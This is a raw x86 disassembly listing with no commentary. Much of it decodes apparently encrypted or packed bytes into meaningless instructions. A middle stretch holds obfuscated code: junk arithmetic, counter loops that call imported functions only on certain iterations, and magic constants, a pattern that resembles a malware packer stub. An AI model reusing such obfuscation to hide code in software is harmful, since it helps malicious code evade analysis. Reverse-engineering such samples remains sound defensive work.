  411b68:	and    bl,cl
  411b6a:	fst    DWORD PTR [ecx+ebp*8+0x36a5ad06]
  411b71:	mov    al,0xff
  411b73:	inc    edi
  411b74:	sbb    BYTE PTR [ecx+esi*4-0x51],cl
  411b78:	retf   0xa575
  411b7b:	xchg   edi,eax
  411b7c:	cmp    al,0xff
  411b7e:	dec    ebx
  411b7f:	pop    ds
  411b80:	jge    0x411be1
  411b82:	sbb    BYTE PTR [ecx+0x5c],ch
  411b85:	and    WORD PTR [edi+ebp*4-0x7a2a7fd5],si
  411b8d:	pop    ecx
  411b8e:	addr16 mov edx,0x37881afc
  411b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b95:	loopne 0x411b2b
  411b97:	imul   bh
  411b99:	mov    bh,0x2b
  411b9b:	popa   
  411b9c:	inc    eax
  411b9d:	repnz xchg edi,eax
  411b9f:	add    al,0x15
  411ba1:	mov    al,0x68
  411ba3:	pop    esp
  411ba4:	push   ebp
  411ba5:	js     0x411bf1
  411ba7:	scas   al,BYTE PTR es:[edi]
  411ba8:	and    BYTE PTR [eax+0x54],dh
  411bab:	pop    bx
  411bad:	fiadd  DWORD PTR [ecx+eax*4+0x74]
  411bb1:	std    
  411bb2:	iret   
  411bb3:	shl    cl,0xa9
  411bb6:	shl    DWORD PTR [edi+0x67],1
  411bb9:	dec    eax
  411bba:	scas   al,BYTE PTR es:[edi]
  411bbb:	or     dl,al
  411bbd:	sbb    ah,BYTE PTR [ecx]
  411bbf:	cmp    ebx,DWORD PTR [ecx-0x32fcc6b3]
  411bc5:	inc    ebx
  411bc6:	or     al,bl
  411bc8:	daa    
  411bc9:	dec    esp
  411bca:	lds    eax,FWORD PTR ss:[ebp-0x13]
  411bce:	and    cl,bh
  411bd0:	jns    0x411b7e
  411bd2:	aam    0x8f
  411bd4:	ja     0x411bd9
  411bd6:	aaa    
  411bd7:	xor    al,BYTE PTR [esp+esi*2]
  411bda:	jnp    0x411bfa
  411bdc:	inc    eax
  411bdd:	add    cl,bh
  411bdf:	jecxz  0x411b93
  411be1:	mov    ch,0xa8
  411be3:	repnz inc eax
  411be5:	xor    DWORD PTR ds:0xbc409895,esp
  411beb:	cmp    DWORD PTR [ecx+0x43f38fe3],ecx
  411bf1:	int    0xd9
  411bf3:	pop    ss
  411bf4:	aam    0x8b
  411bf6:	xchg   esi,eax
  411bf7:	fist   WORD PTR [ebp-0x53d6d4a5]
  411bfd:	mov    ebx,0x80283c0d
  411c02:	(bad)  [esi]
  411c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c05:	jmp    0x411bc8
  411c07:	or     dh,BYTE PTR [ebx-0x2a]
  411c0a:	push   ebx
  411c0b:	fld    TBYTE PTR [ecx]
  411c0d:	pop    ebp
  411c0e:	jecxz  0x411bf6
  411c10:	mov    bh,0xa3
  411c12:	jno    0x411bbe
  411c14:	sbb    ecx,DWORD PTR [ebp+0x42297214]
  411c1a:	jne    0x411bd1
  411c1c:	lea    ebx,[edi+eiz*2]
  411c1f:	cli    
  411c20:	jge    0x411c7a
  411c22:	push   DWORD PTR [ecx+ebx*4]
  411c25:	out    dx,eax
  411c26:	(bad)  
  411c28:	push   ds
  411c29:	xchg   ebp,eax
  411c2a:	jo     0x411bdf
  411c2c:	adc    DWORD PTR [edx+eiz*2-0x7128cc72],eax
  411c33:	xlat   BYTE PTR ds:[ebx]
  411c34:	inc    ecx
  411c35:	sub    BYTE PTR [ebx],cl
  411c37:	(bad)  
  411c38:	(bad)  
  411c39:	loope  0x411bcd
  411c3b:	adc    DWORD PTR [esi],eax
  411c3d:	xor    al,0x7e
  411c3f:	cmp    DWORD PTR [edi],ebx
  411c41:	cs mov cl,0x94
  411c44:	clc    
  411c45:	and    al,0x45
  411c47:	xchg   ebp,eax
  411c48:	out    0x39,al
  411c4a:	add    al,0x50
  411c4c:	dec    esi
  411c4d:	add    DWORD PTR [edi-0x128231c4],ebp
  411c53:	aad    0x1
  411c55:	setns  BYTE PTR [edx+0x454f6c0]
  411c5c:	or     al,0x24
  411c5e:	loopne 0x411cc4
  411c60:	outs   dx,BYTE PTR ds:[esi]
  411c61:	scas   eax,DWORD PTR es:[edi]
  411c62:	call   0x6bf1fb41
  411c67:	pop    esi
  411c68:	sub    eax,ebp
  411c6a:	dec    eax
  411c6b:	xchg   ebx,eax
  411c6c:	mov    ebx,0x815f1e71
  411c71:	xor    eax,0xe4beb25c
  411c76:	test   eax,0x99635668
  411c7b:	sbb    bh,BYTE PTR [edx+0x25]
  411c7e:	mov    eax,0x8716083
  411c83:	jae    0x411cdd
  411c85:	and    al,0x0
  411c87:	dec    eax
  411c88:	call   0xece68db5
  411c8d:	push   edi
  411c8e:	jmp    0xec0:0x946611b6
  411c95:	cmp    esi,DWORD PTR [edi]
  411c97:	mov    ch,0xf8
  411c99:	arpl   WORD PTR ds:0x10a82249,di
  411c9f:	sbb    BYTE PTR [ebp+ecx*1-0x3d],bh
  411ca3:	adc    DWORD PTR [ebp+ecx*4+0x30],edi
  411ca7:	fwait
  411ca8:	cs dec edi
  411caa:	loope  0x411cdd
  411cac:	mov    WORD PTR [esi],ds
  411cae:	inc    ebx
  411caf:	into   
  411cb0:	or     cl,BYTE PTR [ebx+0x19e70b9]
  411cb6:	push   ecx
  411cb7:	push   0x3d4e41d2
  411cbc:	dec    ebp
  411cbd:	dec    ebp
  411cbe:	xchg   ecx,eax
  411cbf:	mov    dl,0x71
  411cc1:	sbb    bl,BYTE PTR [ecx-0x24]
  411cc4:	rcl    BYTE PTR [ebp+0xb],0xfb
  411cc8:	xor    DWORD PTR [ecx],ebp
  411cca:	stos   DWORD PTR es:[edi],eax
  411ccb:	jnp    0x411c97
  411ccd:	pop    edi
  411cce:	mov    eax,ds:0xe236300f
  411cd3:	cld    
  411cd4:	hlt    
  411cd5:	frstor [ecx]
  411cd7:	jp     0x411ced
  411cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cda:	fs sbb eax,0x3b8d88f
  411ce0:	(bad)  
  411ce1:	(bad)  
  411ce2:	adc    esi,edi
  411ce4:	cmp    ebp,DWORD PTR [ebx-0x43]
  411ce7:	xchg   ebx,eax
  411ce8:	lods   al,BYTE PTR ds:[esi]
  411ce9:	cld    
  411cea:	je     0x411cd5
  411cec:	jecxz  0x411ca5
  411cee:	cmp    al,BYTE PTR [ebx-0x6f938461]
  411cf4:	mov    DWORD PTR [edx+0x5c],ebp
  411cf7:	icebp  
  411cf8:	sub    eax,0x78a0e5ff
  411cfd:	pop    eax
  411cfe:	sub    DWORD PTR [eax],edi
  411d00:	adc    DWORD PTR [esi-0x32],esp
  411d03:	inc    ecx
  411d04:	push   0xffffffd3
  411d06:	jae    0x411d14
  411d08:	(bad)  
  411d09:	adc    DWORD PTR [esi+0x45058725],edi
  411d0f:	and    DWORD PTR [edi-0x4f56a369],ebx
  411d15:	sahf   
  411d16:	(bad)  
  411d17:	fwait
  411d18:	xchg   esp,eax
  411d19:	loopne 0x411cdb
  411d1b:	ror    ebp,cl
  411d1d:	xlat   BYTE PTR ds:[ebx]
  411d1e:	not    BYTE PTR [ecx+0x1801ff80]
  411d24:	mov    ah,0xd2
  411d26:	in     al,dx
  411d27:	ds dec ebp
  411d29:	test   al,0xc2
  411d2b:	ds or  eax,0x26cd478
  411d31:	dec    ecx
  411d32:	(bad)
  411d35:	div    DWORD PTR [eax]
  411d37:	push   0x6e9633b8
  411d3c:	cmc    
  411d3d:	inc    ebx
  411d3e:	push   ebx
  411d3f:	lds    esp,FWORD PTR [edx+0x10]
  411d42:	bound  ebp,QWORD PTR [ecx]
  411d44:	nop
  411d45:	cmp    BYTE PTR [esi-0x3c646744],0x24
  411d4c:	data16 (bad) 
  411d4e:	sti    
  411d4f:	test   BYTE PTR [edi-0x5c],0xfc
  411d53:	and    BYTE PTR [ecx+0x3a],dl
  411d56:	fwait
  411d57:	inc    esi
  411d58:	push   esp
  411d59:	or     al,0xc7
  411d5b:	stos   BYTE PTR es:[edi],al
  411d5c:	outs   dx,BYTE PTR ds:[esi]
  411d5d:	(bad)  
  411d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d5f:	arpl   cx,bx
  411d61:	mov    WORD PTR [eax+0x57],es
  411d64:	push   ebx
  411d65:	hlt    
  411d66:	cmp    ebp,DWORD PTR [edi-0xdd5d97f]
  411d6c:	aas    
  411d6d:	outs   dx,DWORD PTR ds:[esi]
  411d6e:	xor    bh,BYTE PTR [edi]
  411d70:	bound  ebx,QWORD PTR [edi+0x6141b3d9]
  411d76:	push   ebx
  411d77:	sub    DWORD PTR [eax-0x2e],edx
  411d7a:	jo     0x411d06
  411d7c:	fimul  WORD PTR [eax+0x50]
  411d7f:	pop    ds
  411d80:	lock xchg edi,eax
  411d82:	pop    edx
  411d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d84:	aas    
  411d85:	pop    es
  411d86:	lods   al,BYTE PTR ds:[esi]
  411d87:	mov    ebp,0xefb66bc8
  411d8c:	ret    
  411d8d:	adc    esi,esp
  411d8f:	add    dl,BYTE PTR [edx+0x76d04a16]
  411d95:	dec    ecx
  411d96:	mov    ds:0x2cf57873,al
  411d9b:	add    DWORD PTR ds:0xa0305632,ecx
  411da1:	gs scas eax,DWORD PTR es:[edi]
  411da3:	push   ebp
  411da4:	add    dh,al
  411da6:	fst    st(7)
  411da8:	dec    edx
  411da9:	mov    edx,0x96b40432
  411dae:	pop    edx
  411daf:	sub    al,BYTE PTR [esi-0x13]
  411db2:	dec    ebp
  411db3:	or     dh,BYTE PTR [ebx+0x708a03cc]
  411db9:	mov    ch,0xd0
  411dbb:	(bad)  
  411dbc:	sub    BYTE PTR [esi-0x39],bh
  411dbf:	and    bl,0x60
  411dc2:	sbb    eax,0x98ab0900
  411dc7:	cmp    BYTE PTR [ecx],cl
  411dc9:	sbb    eax,DWORD PTR [esi+0x78]
  411dcc:	lea    edi,[eax+esi*1]
  411dcf:	es or  ebx,ebp
  411dd2:	mov    edi,0xc2c8dc67
  411dd7:	mov    al,0x79
  411dd9:	nop
  411dda:	mov    gs,WORD PTR ds:0xfc8d8f80
  411de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411de1:	repnz mov al,BYTE PTR [ebp+0x3386a4fb]
  411de8:	test   BYTE PTR [ecx],0x34
  411deb:	and    esi,esi
  411ded:	inc    eax
  411dee:	repnz lock cs inc ebx
  411df2:	push   es
  411df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411df4:	ja     0x411e2f
  411df6:	out    dx,al
  411df7:	inc    esi
  411df8:	scas   eax,DWORD PTR es:[edi]
  411df9:	fild   DWORD PTR [esi]
  411dfb:	and    DWORD PTR [esi-0x4baacd81],ecx
  411e01:	ds jl  0x411e06
  411e04:	cmp    al,0x63
  411e06:	enter  0x2313,0x92
  411e0a:	aam    0x1d
  411e0c:	pusha  
  411e0d:	ins    BYTE PTR es:[edi],dx
  411e0e:	stc    
  411e0f:	cmc    
  411e10:	es push eax
  411e12:	adc    eax,0x65da413f
  411e17:	xchg   esp,eax
  411e18:	test   al,0x29
  411e1a:	lds    eax,FWORD PTR [edx]
  411e1c:	outs   dx,DWORD PTR ds:[esi]
  411e1d:	in     al,0x67
  411e1f:	int3   
  411e20:	dec    eax
  411e21:	inc    ecx
  411e22:	mov    esp,0xc4f3d571
  411e27:	mov    DWORD PTR [ecx+0x76516b44],esi
  411e2d:	fcomp  QWORD PTR [ebx+0x56]
  411e30:	mov    edx,edx
  411e32:	push   esp
  411e33:	cmc    
  411e34:	mov    WORD PTR [eax-0x3a],es
  411e37:	sub    al,0xbd
  411e39:	fnstsw WORD PTR [edi-0x5fc2b38a]
  411e3f:	cmp    al,0x87
  411e41:	je     0x411e57
  411e43:	jns    0x411e1e
  411e45:	jle    0x411ebe
  411e47:	arpl   cx,cx
  411e49:	popf   
  411e4a:	adc    cl,BYTE PTR [ebp-0x97c92af]
  411e50:	add    BYTE PTR [ebx],bh
  411e52:	ror    DWORD PTR [edi],cl
  411e54:	test   DWORD PTR [eax+eax*1],ebx
  411e57:	add    BYTE PTR [eax],al
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x42404e
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x4240d2
  411ee2:	mov    esi,DWORD PTR ds:0x4240ca
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x4240ca,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x4240ca
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x4240ca
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x4240ca
  411f41:	mov    ds:0x4240d2,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x42404e
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x42415a
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x4244fe
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423e5a
  41216a:	mov    eax,ds:0x4243bd
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x4243ec
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0x91f94cc8
  412330:	inc    edi
  412331:	fst    DWORD PTR [edi-0x22]
  412334:	imul   esp,DWORD PTR [edx+0x62],0x50
  412338:	pop    edi
  412339:	bound  esp,QWORD PTR [edx+0x57]
  41233c:	mov    ecx,DWORD PTR [eax-0x3c15e2b0]
  412342:	mov    bh,0x59
  412344:	mov    ebx,0xb24aa03e
  412349:	mov    ebp,0x16921e84
  41234e:	xchg   ebx,eax
  41234f:	es retf 
  412351:	or     bh,BYTE PTR [eax+0x67ef4aac]
  412357:	int3   
  412358:	imul   al
  41235a:	call   0xe9ffaa44
  41235f:	dec    ecx
  412360:	inc    esp
  412361:	jp     0x41239a
  412363:	mov    esi,0x27dd9f43
  412368:	pop    edi
  412369:	fldenv es:[ebx+0x28e146e5]
  412370:	xor    esi,ecx
  412372:	lods   eax,DWORD PTR ds:[esi]
  412373:	jb     0x412320
  412375:	adc    eax,0x2653df0
  41237a:	inc    edx
  41237b:	xchg   BYTE PTR [edx],dl
  41237d:	mov    edi,0x2b4df244
  412382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412383:	loop   0x412359
  412385:	sub    BYTE PTR [ebp+0x5a],bl
  412388:	or     esp,DWORD PTR [edi-0x65]
  41238b:	add    eax,0x2db80c3e
  412390:	mov    ?,WORD PTR [ebx+0x15]
  412393:	push   0x8a231ce0
  412398:	or     eax,ebp
  41239a:	xor    ecx,DWORD PTR [eax+0x28]
  41239d:	cmp    BYTE PTR [eax],dl
  41239f:	sar    BYTE PTR [ecx-0x34],1
  4123a2:	repnz imul esp,DWORD PTR [ebx+0x3],0xffffffd3
  4123a7:	dec    eax
  4123a8:	pop    ebx
  4123a9:	xor    eax,0x1ec1705b
  4123ae:	inc    esi
  4123af:	pop    ebx
  4123b0:	mov    esp,0x6f7222cf
  4123b5:	jno    0x4123e0
  4123b7:	xchg   cl,dh
  4123b9:	mov    ebx,0x505aa7ad
  4123be:	enter  0xca63,0xe0
  4123c2:	jns    0x41242c
  4123c4:	sahf   
  4123c5:	aaa    
  4123c6:	pop    esi
  4123c7:	add    DWORD PTR ds:0x9cb5cc7c,0xffffffdb
  4123ce:	(bad)  
  4123cf:	jecxz  0x412397
  4123d1:	sub    al,0xb6
  4123d3:	xchg   esp,eax
  4123d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d5:	push   0xffffffaf
  4123d7:	stc    
  4123d8:	int    0xd2
  4123da:	imul   edx,edx,0xffffff84
  4123dd:	mov    eax,0xa024c6f1
  4123e2:	fabs   
  4123e4:	call   0x1aca:0x70bd4a12
  4123eb:	pop    ss
  4123ec:	and    DWORD PTR [edi],eax
  4123ee:	test   eax,0xb3f17f76
  4123f3:	fisubr WORD PTR [esp+edi*1]
  4123f6:	out    0xf0,eax
  4123f8:	and    DWORD PTR [ecx+0x31293f25],ecx
  4123fe:	sar    DWORD PTR [esi],cl
  412400:	xor    cl,BYTE PTR [edi+0x73653947]
  412406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412407:	in     eax,dx
  412408:	loop   0x41239b
  41240a:	leave  
  41240b:	call   0x3e1dff25
  412410:	xchg   edx,eax
  412411:	cld    
  412412:	fild   QWORD PTR [ecx]
  412414:	add    ebp,esp
  412416:	punpckhdq mm7,QWORD PTR [eax-0x5c]
  41241a:	inc    ecx
  41241b:	fst    QWORD PTR [edx]
  41241d:	jo     0x41244f
  41241f:	or     esp,DWORD PTR [edi+eax*2]
  412422:	sub    eax,0xb0f7f126
  412427:	mov    BYTE PTR [ebx+ebp*2],cl
  41242a:	out    0x9e,al
  41242c:	fimul  DWORD PTR [ebx+0x2f]
  41242f:	push   ebx
  412430:	push   0xc
  412432:	(bad)  
  412433:	mov    ch,0x8f
  412435:	lods   eax,DWORD PTR ds:[esi]
  412436:	scas   eax,DWORD PTR es:[edi]
  412437:	mov    esp,0xe244bd17
  41243c:	adc    al,0x2a
  41243e:	and    al,0x6f
  412440:	ss or  al,0x42
  412443:	mov    ebx,0x713cd6ad
  412448:	pop    ss
  412449:	je     0x412490
  41244b:	and    eax,0x11ffffb4
  412450:	loopne 0x4124c0
  412452:	and    BYTE PTR [ebx+0x228c6a4],0x7a
  412459:	push   0xfffffffd
  41245b:	xor    eax,0xc9a9e850
  412460:	jp     0x4124a0
  412462:	or     cl,BYTE PTR [ebp-0x2d]
  412465:	add    DWORD PTR [edx-0x7d],esi
  412468:	cmp    ecx,DWORD PTR [eax+0x30]
  41246b:	out    0xb9,al
  41246d:	pusha  
  41246e:	xor    al,0x12
  412470:	fs mov eax,ds:0xd89ad082
  412477:	push   es
  412478:	add    bh,bh
  41247a:	into   
  41247b:	mov    WORD PTR [edi],?
  41247d:	mov    edx,0x500a0466
  412482:	(bad)  
  412483:	or     eax,0xbeb208d6
  412488:	es scas eax,DWORD PTR es:[edi]
  41248a:	mov    bl,0xb3
  41248c:	bnd jo 0x4124e1
  41248f:	dec    ebp
  412490:	xchg   esp,eax
  412491:	mov    ds:0x36c4327a,eax
  412496:	xchg   esp,eax
  412497:	sub    ah,bh
  412499:	adc    eax,0x9a501735
  41249e:	ret    
  41249f:	sbb    DWORD PTR [edi-0x4addc3a3],0xffffffd4
  4124a6:	push   ebp
  4124a7:	arpl   WORD PTR [ebp-0x5576e326],bp
  4124ad:	pop    esi
  4124ae:	test   esp,ebp
  4124b0:	mov    al,ds:0x23f135f0
  4124b5:	jmp    0xa52d:0x48a1c887
  4124bc:	int    0x56
